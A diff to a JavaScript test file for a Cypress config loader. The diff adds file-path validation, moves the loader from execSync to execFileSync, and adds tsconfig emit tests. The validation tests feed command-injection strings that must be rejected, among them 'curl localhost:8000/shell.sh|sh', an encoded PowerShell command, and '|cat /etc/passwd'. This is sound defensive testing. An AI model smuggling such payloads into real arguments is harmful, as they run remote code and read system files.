@@ -40,26 +40,83 @@ describe("readCypressConfigUtil", () => {
         });
     });
 
-    describe('loadJsFile', () => {
-        it('should load js file', () => {
-            const loadCommandStub = sandbox.stub(cp, "execSync").returns("random string");
-            const readFileSyncStub = sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
-            const existsSyncStub = sandbox.stub(fs, 'existsSync').returns(true);
-            const unlinkSyncSyncStub = sandbox.stub(fs, 'unlinkSync');
-            const requireModulePath = path.join(__dirname, '../../../../', 'bin', 'helpers', 'requireModule.js');
-            
-            const result =  readCypressConfigUtil.loadJsFile('path/to/cypress.config.ts', 'path/to/tmpBstackPackages');
-            
-            expect(result).to.eql({ e2e: {} });
-            sinon.assert.calledOnceWithExactly(loadCommandStub, `NODE_PATH="path/to/tmpBstackPackages" node "${requireModulePath}" "path/to/cypress.config.ts"`);
-            sinon.assert.calledOnce(readFileSyncStub);
-            sinon.assert.calledOnce(unlinkSyncSyncStub);
-            sinon.assert.calledOnce(existsSyncStub);
+    describe('validateFilePath', () => {
+        it('should accept a normal file path', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('path/to/cypress.config.js')).to.not.throw();
         });
 
-        it('should load js file for win', () => {
+        it('should accept paths with spaces', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('path/to my project/cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept Windows absolute paths with backslashes', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('C:\\Users\\test\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept Windows absolute paths with spaces and backslashes (Program Files)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('C:\\Program Files\\my app\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept Windows relative paths with backslashes', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('.\\subdir\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should accept UNC-style Windows paths', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('\\\\server\\share\\cypress.config.js')).to.not.throw();
+        });
+
+        it('should reject paths with semicolons (command injection)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config";curl localhost:8000/shell.sh|sh;".js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with ampersands (Windows command injection)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config"&powershell -encodedcommand abc&".js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with backticks (subshell injection)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config`whoami`.js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with dollar signs (variable expansion)', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config$(id).js'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject paths with pipe characters', () => {
+            expect(() => readCypressConfigUtil.validateFilePath('cypress.config|cat /etc/passwd'))
+                .to.throw(/disallowed characters/);
+        });
+    });
+
+    describe('loadJsFile', () => {
+        it('should load js file using execFileSync', () => {
+            const execFileStub = sandbox.stub(cp, "execFileSync").returns("random string");
+            const readFileSyncStub = sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
+            const existsSyncStub = sandbox.stub(fs, 'existsSync').returns(true);
+            const unlinkSyncSyncStub = sandbox.stub(fs, 'unlinkSync');
+            const requireModulePath = path.join(__dirname, '../../../../', 'bin', 'helpers', 'requireModule.js');
+
+            const result =  readCypressConfigUtil.loadJsFile('path/to/cypress.config.ts', 'path/to/tmpBstackPackages');
+
+            expect(result).to.eql({ e2e: {} });
+            // Verify execFileSync is called with 'node' as first arg and array of args
+            sinon.assert.calledOnce(execFileStub);
+            expect(execFileStub.getCall(0).args[0]).to.eql('node');
+            expect(execFileStub.getCall(0).args[1]).to.eql([requireModulePath, 'path/to/cypress.config.ts']);
+            // Verify NODE_PATH is passed via env option
+            expect(execFileStub.getCall(0).args[2].env.NODE_PATH).to.eql('path/to/tmpBstackPackages');
+            sinon.assert.calledOnce(readFileSyncStub);
+            sinon.assert.calledOnce(unlinkSyncSyncStub);
+            // existsSync is now called twice: once for the file-not-found UX check, once for the unlink cleanup
+            sinon.assert.calledTwice(existsSyncStub);
+        });
+
+        it('should load js file using execFileSync on Windows too (no platform-specific branching needed)', () => {
             sinon.stub(process, 'platform').value('win32');
-            const loadCommandStub = sandbox.stub(cp, "execSync").returns("random string");
+            const execFileStub = sandbox.stub(cp, "execFileSync").returns("random string");
             const readFileSyncStub = sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
             const existsSyncStub = sandbox.stub(fs, 'existsSync').returns(true);
             const unlinkSyncSyncStub = sandbox.stub(fs, 'unlinkSync');
@@ -68,10 +125,52 @@ describe("readCypressConfigUtil", () => {
             const result =  readCypressConfigUtil.loadJsFile('path/to/cypress.config.ts', 'path/to/tmpBstackPackages');
             
             expect(result).to.eql({ e2e: {} });
-            sinon.assert.calledOnceWithExactly(loadCommandStub, `set NODE_PATH=path/to/tmpBstackPackages&& node "${requireModulePath}" "path/to/cypress.config.ts"`);
+            // Same call signature on Windows - execFileSync handles cross-platform
+            sinon.assert.calledOnce(execFileStub);
+            expect(execFileStub.getCall(0).args[0]).to.eql('node');
+            expect(execFileStub.getCall(0).args[1]).to.eql([requireModulePath, 'path/to/cypress.config.ts']);
+            expect(execFileStub.getCall(0).args[2].env.NODE_PATH).to.eql('path/to/tmpBstackPackages');
             sinon.assert.calledOnce(readFileSyncStub);
             sinon.assert.calledOnce(unlinkSyncSyncStub);
-            sinon.assert.calledOnce(existsSyncStub);
+            // existsSync called twice: file-not-found UX check + unlink cleanup
+            sinon.assert.calledTwice(existsSyncStub);
+        });
+
+        it('should accept Windows-style absolute paths in loadJsFile (no rejection)', () => {
+            sandbox.stub(cp, "execFileSync").returns("random string");
+            sandbox.stub(fs, 'readFileSync').returns('{"e2e": {}}');
+            sandbox.stub(fs, 'existsSync').returns(true);
+            sandbox.stub(fs, 'unlinkSync');
+
+            // None of these should throw
+            expect(() => readCypressConfigUtil.loadJsFile('C:\\Users\\test\\cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.not.throw();
+            expect(() => readCypressConfigUtil.loadJsFile('C:\\Program Files\\my app\\cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.not.throw();
+            expect(() => readCypressConfigUtil.loadJsFile('.\\subdir\\cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.not.throw();
+        });
+
+        it('should throw a clear error when the cypress config file does not exist (UX)', () => {
+            sandbox.stub(fs, 'existsSync').returns(false);
+            const execFileStub = sandbox.stub(cp, "execFileSync");
+
+            expect(() => readCypressConfigUtil.loadJsFile('path/to/missing/cypress.config.js', 'path/to/tmpBstackPackages'))
+                .to.throw(/Cypress config file not found at:/);
+            // execFileSync must NOT be invoked when the file is missing
+            sinon.assert.notCalled(execFileStub);
+        });
+
+        it('should reject file paths containing command injection characters', () => {
+            const maliciousPath = 'cypress.config";curl localhost:8000/shell.sh|sh;".js';
+            expect(() => readCypressConfigUtil.loadJsFile(maliciousPath, 'path/to/tmpBstackPackages'))
+                .to.throw(/disallowed characters/);
+        });
+
+        it('should reject Windows command injection payloads', () => {
+            const maliciousPath = 'cypress.config"&powershell -encodedcommand abc&".js';
+            expect(() => readCypressConfigUtil.loadJsFile(maliciousPath, 'path/to/tmpBstackPackages'))
+                .to.throw(/disallowed characters/);
         });
     });
 
@@ -205,9 +304,57 @@ describe("readCypressConfigUtil", () => {
             const writeFileSyncStub = sandbox.stub(fs, 'writeFileSync');
             
             const result = generateTscCommandAndTempTsConfig(bsConfig, 'path/to/tmpBstackPackages', 'path/to/tmpBstackCompiledJs', 'path/to/cypress.config.ts');
-            
+
             expect(result.tscCommand).to.include('NODE_PATH=path/to/tmpBstackPackages');
             expect(result.tscCommand).to.include('tsc-alias');
+        });
+
+        // NX/monorepo base tsconfigs can set noEmit/emitDeclarationOnly/composite/
+        // noEmitOnError, which suppress or redirect the compiled cypress config JS and break
+        // the read. The extends temp tsconfig must force a clean self-contained JS emit.
+        it('should force emit-friendly compilerOptions overrides in extends approach', () => {
+            const bsConfig = { run_settings: { ts_config_file_path: 'existing/tsconfig.json' } };
+            const existsSyncStub = sandbox.stub(fs, 'existsSync');
+            existsSyncStub.withArgs(path.resolve('existing/tsconfig.json')).returns(true);
+            sandbox.stub(fs, 'readFileSync').returns('{}');
+            const writeFileSyncStub = sandbox.stub(fs, 'writeFileSync');
+
+            generateTscCommandAndTempTsConfig(bsConfig, 'path/to/tmpBstackPackages', 'path/to/tmpBstackCompiledJs', 'path/to/cypress.config.ts');
+
+            const tempConfig = JSON.parse(writeFileSyncStub.getCall(0).args[1]);
+            expect(tempConfig.extends).to.eql(path.resolve('existing/tsconfig.json'));
+            expect(tempConfig.compilerOptions.noEmit).to.be.false;
+            expect(tempConfig.compilerOptions.emitDeclarationOnly).to.be.false;
+            expect(tempConfig.compilerOptions.composite).to.be.false;
+            expect(tempConfig.compilerOptions.noEmitOnError).to.be.false;
+            expect(tempConfig.compilerOptions.declaration).to.be.false;
+        });
+
+        // Tsc returns a non-zero exit code on any type error (common when a single
+        // config file is compiled out of its monorepo context). With '&&', tsc-alias would be
+        // skipped and path aliases left un-rewritten. tsc-alias must run unconditionally.
+        it('should run tsc-alias unconditionally on Unix (";" not "&&")', () => {
+            sinon.stub(process, 'platform').value('linux');
+            const bsConfig = { run_settings: {} };
+            sandbox.stub(fs, 'existsSync').returns(false);
+            sandbox.stub(fs, 'writeFileSync');
+
+            const result = generateTscCommandAndTempTsConfig(bsConfig, 'path/to/tmpBstackPackages', 'path/to/tmpBstackCompiledJs', 'path/to/cypress.config.ts');
+
+            expect(result.tscCommand).to.not.include('&&');
+            expect(result.tscCommand).to.match(/--project "[^"]*" ; NODE_PATH=/);
+        });
+
+        it('should run tsc-alias unconditionally on Windows ("&" between tsc and tsc-alias)', () => {
+            sinon.stub(process, 'platform').value('win32');
+            const bsConfig = { run_settings: {} };
+            sandbox.stub(fs, 'existsSync').returns(false);
+            sandbox.stub(fs, 'writeFileSync');
+
+            const result = generateTscCommandAndTempTsConfig(bsConfig, 'path/to/tmpBstackPackages', 'path/to/tmpBstackCompiledJs', 'path/to/cypress.config.ts');
+
+            // unconditional '&' connects the tsc invocation to the tsc-alias invocation
+            expect(result.tscCommand).to.match(/--project "[^"]*" & set NODE_PATH=/);
         });
     });
 
